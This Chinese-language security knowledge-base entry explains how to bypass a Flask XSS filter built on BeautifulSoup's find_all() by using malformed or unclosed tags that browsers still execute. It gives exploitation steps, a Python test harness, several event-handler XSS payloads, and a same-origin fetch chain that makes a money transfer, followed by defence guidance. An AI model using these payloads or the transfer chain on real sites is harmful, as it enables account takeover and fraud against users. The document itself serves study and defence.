---
id: web-generic-xss-beautifulsoup-findall-parser-differential-bypass
title: BeautifulSoup find_all 标签检测绕过：畸形/未闭合标签在浏览器仍执行的解析器差异
type: scenario
domain: web
path: web/generic/xss
technique: beautifulsoup-findall-parser-differential-bypass
tags:
- web
- xss
- filter-bypass
- beautifulsoup
- html-parser
- parser-differential
- flask
- python
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V283
  verified_at: '2026-11-08T04:51:42+08:00'
  notes: '已对照原文与全部 7 张图核对：check_xss=BeautifulSoup(text,html.parser).find_all() 标签存在性检测；Server: Werkzeug/3.0.3 Python/3.10.12；畸形/未闭合 <img src=1 onerror=alert(1) 借助页面后续 </body> 的 > 闭合，DevTools DOM 显示为 <img src="1" onerror="alert(1)" <="" body="">，目标环境弹窗成功（img/06-07）；转账 fetch 链 money=10000&transfer_id=21e3e7f6210 与原文一致。未在本地复跑 BeautifulSoup 检测；原文未声明受影响版本区间，未设置 versions。'
url: /docs/web/generic/xss/web-generic-xss-beautifulsoup-findall-parser-differential-bypass/
draft: false
kb_aliases:
- BeautifulSoup XSS bypass
- find_all 标签检测绕过
- html.parser 解析差异
- 畸形标签 XSS
- 未闭合标签 XSS
- Flask XSS 过滤绕过
- 解析器差异
---

## 一句话结论

服务端若只用 `BeautifulSoup(text, "html.parser").find_all()` 判断“文本里有没有 HTML 标签”来拦截 XSS，则可以用 BeautifulSoup 解析不出、但浏览器容错解析仍会执行的畸形/未闭合标签（如缺少 `>`、把 `</p` 塞进属性、借助后续 `>` 闭合）绕过：`find_all()` 返回空，拦截通过，浏览器却把 `onerror`/`onload` 当事件处理器执行。

## 原理

- **服务端检测方式**：`check_xss` 用 `BeautifulSoup(text, "html.parser")` 解析用户内容，`soup.find_all()` 有结果就判定存在标签并拒绝。它只匹配 BeautifulSoup 能成功解析出的标签，且没有做实体编码/输出编码，属于“黑名单式标签存在性检查”。
- **BeautifulSoup html.parser 的解析规则**：`html.parser` 用正则识别标签，如 `starttagopen = re.compile('<[a-zA-Z]')`、`locatestarttagend_tolerant`/`endtagfind` 等；它倾向于要求标签有完整的 `<...>` 结构与合法属性语法。对不完整、畸形、属性里带 `</p` 等结构，它可能不产生标签节点，或产生与浏览器不同的节点。
- **浏览器 HTML 解析器的容错**：浏览器按 HTML5 解析算法工作：未闭合的 `<img src=1 onerror=alert(1)` 会在遇到后续 `>`（来自页面模板的 `</p>`、`</body>` 等）时被闭合；属性值中的 `</p` 会被当作属性内容的一部分，而不是结束标签；缺失的结束标签由解析器自动补全。于是同一个字符串在浏览器里成为可执行的 `<img>`/`<svg>` 节点。
- **解析器差异即绕过**：服务端“看不到标签” ≠ 浏览器“不执行标签”。攻击者针对目标页面的上下文（前后已有 `</p>`、`</div>` 等）构造载荷，让 BeautifulSoup 判定为纯文本、浏览器却解析出带事件处理器的元素。
- **常用候选载荷**（需按目标页面上下文实测）：
  - 单标签事件：`<body/onload=alert(1)>`、`<svg/onload=alert(1)>`、`<iframe/onload=alert(1)>`、`<img src=1 onerror=alert(1)>`；
  - 未闭合/借后续 `>` 闭合：`<img src=1 onerror=alert(1)`，依赖页面后续的 `</p>`/`</body>` 提供 `>`；
  - 属性内塞结束标签：`<img src="1" onerror="alert(1)</p">`，浏览器把 `</p` 当属性内容，服务端解析可能失败或识别不同；
  - 若后续 `</p` 造成语法错误，用 JS 注释 `//` 或 HTML 注释把尾部吃掉。
- **为什么能扩大危害**：即使 Flask 配置了 HttpOnly/SameSite 使偷 Cookie 失效，XSS 仍可在同源上下文用 `fetch` 调用站内业务接口（如转账、改资料、删除），无需读取 Cookie。
- **前提与限制**：目标必须把用户内容原样输出到 HTML 上下文；服务端确实使用 BeautifulSoup `find_all()` 这类“标签存在性”检测；浏览器解析行为与攻击者构造的上下文匹配；不同 BeautifulSoup 版本/解析器（html.parser vs lxml/html5lib）行为可能不同，需以目标实际版本测试。

## 触发条件

- 目标把用户可控内容（论坛帖子、评论、个人资料等）输出到 HTML 页面且未做输出编码。
- 服务端 XSS 过滤仅用 BeautifulSoup `find_all()`/标签枚举判断，未使用 HTML 清洗白名单或输出编码。
- 攻击者能控制/预测输出位置前后的 HTML 上下文（是否有 `</p>`、`</div>`、`</body>` 等可用于闭合的 `>`）。
- 目标浏览器会执行事件处理器（无严格 CSP 阻止 inline script/event handler）。

## 利用步骤

1. 确认服务端技术栈（如 `Server: Werkzeug/... Python/...` 提示 Flask），并找到过滤实现（源码/混淆代码/行为测试）。
2. 若过滤是 `BeautifulSoup(text, "html.parser").find_all()` 判空，构造候选畸形标签，先在本地用相同 BeautifulSoup 版本验证 `find_all()` 是否为空。
3. 在目标页面的实际上下文中测试：把候选载荷插入用户内容，观察返回页面中浏览器解析后的 DOM（DevTools Elements），确认是否生成带 `onerror`/`onload` 的元素。
4. 若尾部 `</p` 等导致语法错误，用 `//` 注释或调整属性引号/尖括号位置；反复迭代直到浏览器弹窗。
5. 弹窗成功后，替换为同源 `fetch` 业务操作（示例为转账链）：
   ```javascript
   fetch('/page', { method: 'GET' })
     .then(() => fetch('/transfer', {
       method: 'POST',
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
       body: 'money=10000&transfer_id=<目标ID>'
     }))
     .then(() => { window.location.href = '/forum'; });
   ```
6. 验证业务副作用（余额变化、资料修改等）；若接口有 CSRF token/二次验证，需先从页面读取 token 再随请求提交。

## PoC

本地验证服务端检测（与目标相同的 BeautifulSoup 版本）：

```python
from bs4 import BeautifulSoup

def check_xss(text):
    soup = BeautifulSoup(text, "html.parser")
    return bool(soup.find_all())

payloads = [
    '<img src=1 onerror=alert(1)>',
    '<img src=1 onerror=alert(1)',
    '<img src="1" onerror="alert(1)</p">',
    '<svg/onload=alert(1)>',
]
for p in payloads:
    print(check_xss(p), repr(p))
```

目标页面上下文中的候选载荷（按实际 DOM 调整）：

```html
<img src="1" onerror="alert(1)" <="" body="">
<img src="1" onerror="alert(1)</p">
<img src=1 onerror=alert(1)//
```

同源业务操作链（示例）：

```javascript
fetch('/page', { method: 'GET' })
  .then(function() {
    return fetch('/transfer', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'money=10000&transfer_id=21e3e7f6210'
    });
  })
  .then(function() { window.location.href = '/forum'; });
```

## 变体与关联

- **解析器变体**：目标可能用 `lxml`/`html5lib` 解析器，解析差异与 html.parser 不同；需用相同解析器复现。
- **检测逻辑变体**：只检查 `<script>`、只查黑名单关键字、只做一次 `replace`、只检查标签数量等，都有对应的畸形标签/编码/注释绕过。
- **载荷变体**：`<svg/onload>`、`<body/onload>`、`<iframe/onload>`、`<img onerror>`、`<details open ontoggle>`、`<marquee onstart>` 等；结合 `//`、HTML 注释、属性引号错位。
- **关联**：[[web-generic-xss-filter-bypass-encoding-obfuscation]]（编码/混淆绕过）、[[web-generic-xss-nonglobal-replace-first-match-bypass]]（只替换首个匹配）、[[web-generic-xss-blacklist-attr-breakout-onmouseover-dom-exfil]]（属性逃逸 + 无尖括号事件处理器）、[[web-generic-xss-data-exfiltration-jsonp-image-beacon-multi-channel]]（XSS 外带数据）、[[web-generic-csrf-missing-token-state-changing-endpoint]]（XSS 调用的业务接口缺少 CSRF token 的场景）。
- **边界**：服务端改用 HTML 白名单清洗（bleach/DOMPurify + 严格标签/属性）、输出编码或 CSP 后失效；不同浏览器/解析器对畸形标签的容错不同，需按目标浏览器验证。

## 检测与防御

- **不要用“标签存在性”做 XSS 过滤**：`BeautifulSoup.find_all()` 只反映服务端解析器的理解，不能代表浏览器；应使用成熟的 HTML 清洗库（如 bleach、DOMPurify、OWASP Java HTML Sanitizer）做标签/属性白名单，或直接输出编码。
- **解析器一致性**：若必须检测，使用与浏览器一致的 HTML5 解析器（html5lib）并对畸形输入拒绝/规范化；同时做输出编码（HTML 实体）而非只做输入过滤。
- **CSP**：部署严格 `Content-Security-Policy`（禁止 `unsafe-inline`、限制脚本源）以降低 XSS 执行与事件处理器风险。
- **业务接口防护**：所有状态变更接口（转账、改密、删除）加 CSRF token/二次验证/Origin 校验，避免 XSS 直接调用。
- **检测**：WAF/日志中出现畸形标签、`onerror=`、`</p` 嵌入属性、`//` 注释等特征；对用户内容做浏览器端 DOM 与服务器端解析结果差异审计。
- **响应**：修复过滤逻辑为白名单清洗 + 输出编码；轮换可能泄露的会话；审计业务接口是否被异常调用。
